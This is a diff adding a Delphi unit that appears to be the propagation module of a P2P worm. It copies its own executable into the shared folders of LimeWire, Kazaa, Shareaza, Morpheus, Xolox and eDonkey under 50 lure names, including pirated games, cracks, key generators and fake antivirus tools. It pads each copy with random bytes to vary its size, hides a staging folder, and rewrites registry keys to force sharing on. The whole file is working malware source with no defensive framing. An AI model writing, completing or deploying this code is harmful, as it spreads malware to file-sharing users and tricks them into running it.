@@ -1,0 +1,351 @@
+   UNIT P2P;
+
+   INTERFACE
+
+   USES
+     Windows, SysUtils, Registry;
+
+   PROCEDURE InitPeerToPeer;
+   FUNCTION  WinPath : STRING;
+   PROCEDURE CopyFiles(Hide:BOOL;SourceFile,DestinationFile:TFilename);
+
+   VAR
+     Reg             : TRegistry;
+     ApplicationName : STRING;
+
+   IMPLEMENTATION
+
+   VAR
+     Fake : ARRAY [1..50] OF STRING;
+
+   RESOURCESTRING
+     SysConfigDir = 'Drivers';
+
+   CONST
+     FakeFiles : ARRAY[0..96] OF STRING = (
+                             'CKY3 - Bam Margera World Industries Alien Workshop',
+                             'Cat Attacks Child',
+                             'Windows XP',
+                             'AIM Account Stealer',
+                             'MSN Password Hacker and Stealer',
+                             'Hacking Tool Collection',
+                             'Macromedia Flash 5.0',
+                             'DSL Modem Uncapper',
+                             'Internet and Computer Speed Booster',
+                             'ZoneAlarm Firewall',
+                             'Borland Delphi 6',
+                             'BORLAND Delphi 7',
+                             'Shakira',
+                             'Gladiator',
+                             'AikaQuest3Hentai',
+                             'MoviezChannelsInstaler',
+                             'Zidane-ScreenInstaler',
+                             'LordOfTheRingsr',
+                             'SIMS',
+                             'Quake 4 BETA',
+                             'Xbox.info',
+                             'GTA3',
+                             'Battle.net',
+                             'Warcraft 3 battle.net',
+                             'Half-life WON',
+                             'Winzip 8.0',
+                             'Winrar 3.2',
+                             'Warcraft 3 ONLINE',
+                             'Half-life ONLINE',
+                             'Grand Theft Auto 3',
+                             'Macromedia',
+                             'KaZaA Media Desktop v2.5 UNOFFICIAL',
+                             'KaZaA Spyware Remover',
+                             'Age Of Empires 2',
+                             'Norton AntiVirus 2002',
+                             'Macromedia Dreamweaver MX',
+                             'Microsoft Office XP (English)',
+                             'CloneCD',
+                             'Windows XP SP1',
+                             'The Neverending Story Part I',
+                             'Free Virus Removal Tool From Symantec',
+                             'The Sun Of All Fears',
+                             'Crazy Taxi',
+                             'Duke Nukem Manhattan Project',
+                             'Industry Giant 2',
+                             'F1 Grand Pix 4',
+                             'Star Wars II Movie',
+                             'Nero Burning Rom 5.8.0.1',
+                             'Need For Speed 5 Porsche Unleashed',
+                             'Half Life Blue Shift',
+                             'Quake 3 Arena',
+                             'Warcraft 3',
+                             'Civilization 3',
+                             'Black And White',
+                             'Strike Fighter Project 1',
+                             'Mafia',
+                             'The Eye Of Kraken',
+                             'Hoyle Card Games 2003',
+                             'GTA 3',
+                             'Hard Truck 18 Wheels of Steel',
+                             'Comanche 4',
+                             'Grand Prix 4',
+                             'Age of Sail 2',
+                             'Sudden Strike 2',
+                             'Neverwinter Nights',
+                             'Soldier Of Fortune 2',
+                             'Valhalla Chronicles',
+                             'International Cricket Captain 2003',
+                             'Critical Point Manga game',
+                             'Elder Scrolls III Morrowind THX Brrbrr',
+                             'Unreal Tournament 3',
+                             'Aliens versus Predator 2 Primal Hunt',
+                             'Star Wars Starfighter',
+                             'Norton Utilities 2002 XP',
+                             'Hitman 2 Silent Assassin',
+                             'MS Train Simulator',
+                             'Cabelas Ultimate Deer Hunt 2',
+                             'Dweebs 2',
+                             'Age Of Wonders 2',
+                             'Austerlitz Napoleons Greatest Victory',
+                             'Emperor Rise Of the Middle Kingdom',
+                             'Necromania Trap Of Darkness',
+                             'Prisoner Of War',
+                             'Squad Battles Eagles Strike',
+                             'Stronghold Crusader',
+                             'Tomb Raider 3',
+                             'Deadly Dozen',
+                             'Empire Earth',
+                             'Freedom Force',
+                             'Gearhead Garage',
+                             'Red Ace Squadron',
+                             'Clive Barker’s Undying',
+                             'The Thing',
+                             'Dark Age Of Camelot Shrouded Isles',
+                             'Combat Flight Simulator 3',
+                             'Soldiers Of Anarchy',
+                             'FIFA 2003');
+
+     Addon : ARRAY[0..5] OF STRING = (
+                             'Crack',
+                             'Patch',
+                             'Key Generator',
+                             'Full Downloader',
+                             'ISO - Full Downloader',
+                             'Downloader');
+
+   PROCEDURE RandomFileName;
+   VAR
+     S : STRING;
+     I : BYTE;
+     J : BYTE;
+     Double : BOOL;
+   BEGIN
+     FOR I:=1 TO 50 DO Fake[I]:='';
+     I:=1;
+     REPEAT
+       Double:=False;
+       S:=FakeFiles[Random(SizeOf(FakeFiles) DIV 4)];
+       S:=S+' '+Addon[Random(5)]+'.exe';
+       FOR J:=1 TO I DO IF S=Fake[J] THEN Double:=True;
+       Fake[I]:=S;
+       IF NOT Double THEN Inc(I);
+     UNTIL I=51;
+   END;
+
+   PROCEDURE CopyFiles(Hide: BOOL;SourceFile,DestinationFile:TFilename);
+   BEGIN
+     Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),False);
+     IF Hide then SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
+   END;
+
+   FUNCTION WinPath : STRING;
+   VAR
+     PWindowsDir : ARRAY [0..255] OF Char;
+   BEGIN
+     GetWindowsDirectory(PWindowsDir,255);
+     RESULT:=StrPas(PWindowsDir)+'\';
+   END;
+
+   PROCEDURE ManipulateFileSize(SharedDir : STRING);
+   VAR
+     FakeFile    : FILE;
+     Randombytes : ARRAY[0..1000] OF BYTE;
+     I           : WORD;
+     S           : STRING;
+   BEGIN
+     FOR I:=1 TO 1000 DO RandomBYTEs[i]:=Random(255);
+     FOR I:=1 TO 50 DO BEGIN
+       S:=SharedDir+'\'+Fake[i];
+       IF FileExists(S) THEN BEGIN
+         Assign(FakeFile,S);
+         Reset(FakeFile,1);
+         Seek(FakeFile,FileSize(FakeFile));
+         BlockWrite(FakeFile,RandomBYTEs[0],Random(1000));
+         Close(FakeFile);
+       END;
+     END;
+   END;
+
+   PROCEDURE MakeFakeFiles(SharedDir : STRING);
+   VAR
+     I : WORD;
+   BEGIN
+     If SharedDir<>'' THEN BEGIN
+       RandomFileName;
+       CreateDir(SharedDir);
+       SetFileAttributes(pchar(SharedDir),FILE_ATTRIBUTE_HIDDEN);
+       FOR I:=1 TO 50 DO CopyFiles(False,pChar(ApplicationName),pChar(SharedDir+'\'+Fake[I]));
+       ManipulateFileSize(SharedDir);
+     END;
+   END;
+
+   ////////////////////////////////\EDONKEY/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   FUNCTION FindEDonkey : BOOL;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     RESULT:=Reg.KeyExists('\Software\ed2k');
+     Reg.CloseKey;
+   END;
+
+   FUNCTION EDonkeyShare : STRING;
+   VAR
+     I : WORD;
+     S : STRING;
+   BEGIN
+     Reg.RootKey:=HKEY_LOCAL_MACHINE;
+     Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\eDonkey2000',False);
+     S:=Reg.ReadString('UninstallString');
+     I:=Pos('uninstall',S);
+     IF I>0 THEN BEGIN
+       Delete(S,I-1,Length(S));
+       Delete(S,1,1);
+       RESULT:=S+'\incoming';
+     END;
+     Reg.CloseKey;
+   END;
+
+   /////////////////////////////////\MORPHEUS/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   FUNCTION FindMorpheus : BOOL;
+   BEGIN
+     Reg.RootKey:=HKEY_LOCAL_MACHINE;
+     RESULT:=Reg.KeyExists('\Software\Morpheus');
+     Reg.CloseKey;
+   END;
+
+   FUNCTION MorpheusShare : STRING;
+   VAR
+     I : WORD;
+     S : STRING;
+   BEGIN
+     Reg.RootKey:=HKEY_LOCAL_MACHINE;
+     Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Morpheus 2.0',False);
+     S:=Reg.ReadString('UninstallString');
+     I:=Pos('UNWISE.EXE',S);
+     IF I>0 THEN BEGIN
+       Delete(S,I-1,Length(S));
+       RESULT:=S+'\My Shared Folder';
+     END;
+     Reg.CloseKey;
+   END;
+
+   //////////////////////////////////\XOLOX/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   FUNCTION FindXoloX : BOOL;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     RESULT:=Reg.KeyExists('\Software\Xolox');
+     Reg.CloseKey;
+   END;
+
+   FUNCTION XoloxShare : STRING;
+   VAR
+     I : WORD;
+     S : STRING;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     Reg.OpenKey('Software\Xolox',False);
+     S:=Reg.ReadString('shareddirs');
+     IF Pos(WinPath+SysConfigDir,S)=0 THEN Reg.WriteString('shareddirs',S+'|'+WinPath+SysConfigDir+'\');
+     Reg.CloseKey;
+     RESULT:=WinPath+SysConfigDir;
+   END;
+
+   ///////////////////////////////////\KAZAA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   FUNCTION FindKazaa : BOOL;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     RESULT:=Reg.KeyExists('\Software\Kazaa');
+     Reg.CloseKey;
+   END;
+
+   FUNCTION KazaaShare : STRING;
+   VAR
+     Dir : STRING;
+     I   : WORD;
+     S   : STRING;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     Reg.OpenKey('\Software\Kazaa\LocalContent',True);
+     I:=0;
+     REPEAT
+       Str(I,Dir);
+       Dir:='Dir'+Dir;
+       Inc(I);
+       S:=Reg.ReadString(Dir);
+     UNTIL (S='')or(Pos(SysConfigDir,S)>0);
+     IF S='' THEN Reg.WriteString(Dir,'012345:'+WinPath+SysConfigDir);             // <- Create Dir to Fake Files
+     Reg.WriteInteger('DisableSharing',0);                                         // <- Enable File Sharing
+     Reg.CloseKey;
+     RESULT:=WinPath+SysConfigDir;
+   END;
+
+   /////////////////////////////////\SHAREAZA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   FUNCTION FindShareaza : BOOL;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     RESULT:=Reg.KeyExists('\Software\Shareaza');
+     Reg.CloseKey;
+   END;
+
+   FUNCTION ShareazaShare : STRING;
+   BEGIN
+     Reg.RootKey:=HKEY_CURRENT_USER;
+     Reg.OpenKey('Software\Shareaza\Shareaza\Transfers',False);
+     RESULT:=Reg.ReadString('DownloadsPath');
+     Reg.CloseKey;
+   END;
+
+   /////////////////////////////////\LIMEWIRE/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   FUNCTION FindLimeWire : BOOL;
+   BEGIN
+     Reg.RootKey:=HKEY_LOCAL_MACHINE;
+     RESULT:=Reg.KeyExists('\SOFTWARE\LimeWire');
+     Reg.CloseKey;
+   END;
+
+   FUNCTION LimeWireShare : STRING;
+   BEGIN
+     Reg.RootKey:=HKEY_LOCAL_MACHINE;
+     Reg.OpenKey('SOFTWARE\LimeWire',False);
+     RESULT:=Reg.ReadString('InstallDir')+'\Shared';
+     Reg.CloseKey;
+   END;
+
+   ///////////////////////////////////\INIT/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   PROCEDURE InitPeerToPeer;
+   BEGIN
+     Randomize;
+     Reg:=TRegistry.Create;
+     MakeFakeFiles('C:\My Downloads');
+     IF FindLimeWire THEN MakeFakeFiles(LimeWireShare);
+     IF FindShareaza THEN MakeFakeFiles(ShareazaShare);
+     IF FindKazaa THEN MakeFakeFiles(KazaaShare);
+     IF FindXolox THEN MakeFakeFiles(XoloXShare);
+     IF FindMorpheus THEN MakeFakeFiles(MorpheusShare);
+     IF FindEdonkey THEN MakeFakeFiles(EdonkeyShare);
+     Reg.Free;
+   END;
+
+   END.
